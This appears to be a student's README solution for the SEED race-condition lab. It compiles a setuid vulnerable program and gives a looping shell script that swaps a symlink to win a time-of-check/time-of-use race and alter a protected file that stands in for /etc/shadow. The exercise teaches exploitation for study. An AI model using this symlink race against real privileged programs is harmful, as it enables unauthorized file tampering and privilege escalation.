
# SS

## Lab2

#### Documentation
* [Homepage](http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Race_Condition/)
* [Description](http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Race_Condition/Race_Condition.pdf)

#### Required
* [Ubuntu Virtual Machine](http://www.cis.syr.edu/~wedu/SEEDUbuntu12.04.zip)
* `vulp.c`
* `check.sh`

#### Tasks
1. Edit /tmp/TARGET without authorization

#### Solution

1. Compile `vulp.c`:
```
sudo gcc vulp.c -o vulp
sudo chmod 4755 vulp
```
2. Create `/tmp/TARGET` and `/tmp/XYZ`
```
sudo touch /tmp/TARGET  # simulate /etc/shadow
touch /tmp/XYZ
```

3. Change `check.sh` to apply Race Condition Attack
```
#!/bin/sh

old=`ls -l /tmp/TARGET`
new=`ls -l /tmp/TARGET`

rm dummy
touch dummy

while [ "$old" = "$new" ]
do
        rm /tmp/XYZ
        ln -s dummy /tmp/XYZ
        ./vulp < input.txt &
        rm /tmp/XYZ
        ln -s /tmp/TARGET /tmp/XYZ

        new=`ls -l /tmp/TARGET`
done

echo "STOP... The shadow file has been changed"
```
